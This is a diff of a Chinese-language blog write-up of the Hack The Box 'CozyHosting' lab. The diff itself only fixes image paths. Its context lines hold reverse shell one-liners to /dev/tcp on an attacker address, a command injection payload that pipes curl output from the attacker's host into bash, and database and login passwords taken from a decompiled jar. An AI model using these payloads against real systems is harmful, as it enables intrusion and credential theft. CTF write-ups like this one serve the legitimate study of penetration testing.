@@ -94,7 +94,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/tcp/10.10.14.7/8002 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
 <p>另一边直接监听就好了</p>
-<p><img src="/image%5CHTB3%5Ccozyhosting%5C%E7%BB%95%E7%A9%BA%E6%A0%BC%E4%B8%8A%E7%BA%BF.png" alt="这是图片" title="hosts"></p>
+<p><img src="/image/HTB3/cozyhosting/%E7%BB%95%E7%A9%BA%E6%A0%BC%E4%B8%8A%E7%BA%BF.png" alt="这是图片" title="hosts"></p>
 <h3 id="分段反向shell"><a href="#分段反向shell" class="headerlink" title="分段反向shell"></a>分段反向shell</h3><p>然后还学习到一个新姿势，查了一些资料。首先使用如下命令来创建一个与攻击者的tcp连接，并将标准输入(0)重定向到这个连接，sh是一个子shell的标记，用来在括号内执行命令。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;`(sh)0&gt;/dev/tcp/10.10.14.21/9999`</span><br></pre></td></tr></table></figure>
 
@@ -105,15 +105,15 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null -c bash</span><br></pre></td></tr></table></figure>
 
 <p>最后成功反弹shell.</p>
-<p><img src="/image%5CHTB3%5Ccozyhosting%5C%E5%88%86%E6%AE%B5.png" alt="这是图片" title="hosts"></p>
+<p><img src="/image/HTB3/cozyhosting/%E5%88%86%E6%AE%B5.png" alt="这是图片" title="hosts"></p>
 <h3 id="python客户端反弹shell"><a href="#python客户端反弹shell" class="headerlink" title="python客户端反弹shell"></a>python客户端反弹shell</h3><p>这个就</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80 -d /   </span><br></pre></td></tr></table></figure>
 
 <p>起一个客户端挂一个目录 然后我写了一个 文件叫1   内容是 bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.7&#x2F;8002 0&gt;&amp;1</p>
 <p>这边用 命令 xxx|curl$IFS$910.10.14.7&#x2F;1|bash%0a      因为 会把host放到你username 后面 有影响 加%0a让后面没有影响</p>
 <p>然后另一边监听就行了</p>
-<p><img src="/image%5CHTB3%5Ccozyhosting%5Cpython%E8%AF%B7%E6%B1%82%E4%B8%8A%E7%BA%BF.png" alt="这是图片" title="hosts"></p>
-<p><img src="/image%5CHTB3%5Ccozyhosting%5Cpythonserver.png" alt="这是图片" title="hosts"></p>
+<p><img src="/image/HTB3/cozyhosting/python%E8%AF%B7%E6%B1%82%E4%B8%8A%E7%BA%BF.png" alt="这是图片" title="hosts"></p>
+<p><img src="/image/HTB3/cozyhosting/pythonserver.png" alt="这是图片" title="hosts"></p>
 <h2 id="jar包分析"><a href="#jar包分析" class="headerlink" title="jar包分析"></a>jar包分析</h2><p>上去之后看到有个jar包</p>
 <p>弄下来分析一下</p>
 <p>他有python 环境 可以用上面的方法 服务器上运行</p>
@@ -131,10 +131,10 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.10.11.230 8001 &gt; 2.jar</span><br></pre></td></tr></table></figure>
 
 <p>下载下来之后反编译 jar包</p>
-<p><img src="/image%5CHTB3%5Ccozyhosting%5Ccurl%E4%B8%8B%E8%BD%BDjar%E5%8C%85.png" alt="这是图片" title="hosts"></p>
-<p><img src="/image%5CHTB3%5Ccozyhosting%5Cnc%E4%B8%8B%E8%BD%BDjar%E5%8C%85.png" alt="这是图片" title="hosts"></p>
-<p><img src="/image%5CHTB3%5Ccozyhosting%5Cjar%E5%8C%85%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E5%AE%B9.png" alt="这是图片" title="hosts"></p>
-<p><img src="/image%5CHTB3%5Ccozyhosting%5Cjar%E5%8C%85%E4%BF%A1%E6%81%AF.png" alt="这是图片" title="hosts"></p>
+<p><img src="/image/HTB3/cozyhosting/curl%E4%B8%8B%E8%BD%BDjar%E5%8C%85.png" alt="这是图片" title="hosts"></p>
+<p><img src="/image/HTB3/cozyhosting/nc%E4%B8%8B%E8%BD%BDjar%E5%8C%85.png" alt="这是图片" title="hosts"></p>
+<p><img src="/image/HTB3/cozyhosting/jar%E5%8C%85%E6%95%B0%E6%8D%AE%E5%BA%93%E5%86%85%E5%AE%B9.png" alt="这是图片" title="hosts"></p>
+<p><img src="/image/HTB3/cozyhosting/jar%E5%8C%85%E4%BF%A1%E6%81%AF.png" alt="这是图片" title="hosts"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username=kanderson&amp;password=MRdEQuv6~6P9</span><br><span class="line"></span><br><span class="line">spring.datasource.platform=postgres</span><br><span class="line">spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting</span><br><span class="line">spring.datasource.username=postgres</span><br><span class="line">spring.datasource.password=Vg&amp;nvzAQ7XxR</span><br></pre></td></tr></table></figure>
 
 <p>发现有数据库psql</p>
